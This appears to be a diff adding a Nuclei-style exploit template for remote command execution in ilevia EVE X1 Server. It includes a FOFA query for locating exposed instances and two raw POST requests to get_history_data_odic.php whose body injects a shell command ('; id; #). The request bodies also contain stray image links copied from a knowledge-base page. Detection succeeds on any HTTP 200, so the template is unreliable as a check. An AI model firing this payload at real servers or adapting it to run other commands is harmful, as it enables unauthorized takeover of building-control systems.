@@ -1,0 +1,60 @@
+id: poc-pr0ghbefn96wbps5
+info:
+  name: ileviaEVEX1Server接口mbus_build存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pr0ghbefn96wbps5'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pr0ghbefn96wbps5
+    fofa: app="ilevia-EVE-X1-Server"
+http:
+- raw:
+  - 'POST /ajax/history/get_history_data_odic.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1
+
+    Connection: close
+
+    Content-Length: 18
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip
+
+
+    e="; id; #
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547016380-fa571fa4-983b-4b4a-91c2-65d7b8b142c5.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /history/get_history_data_odic.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1
+
+    Connection: close
+
+    Content-Length: 18
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Encoding: gzip
+
+
+    e="; id; #
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547016563-00ec8921-2fc7-487d-ae17-558f8ab3fe86.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
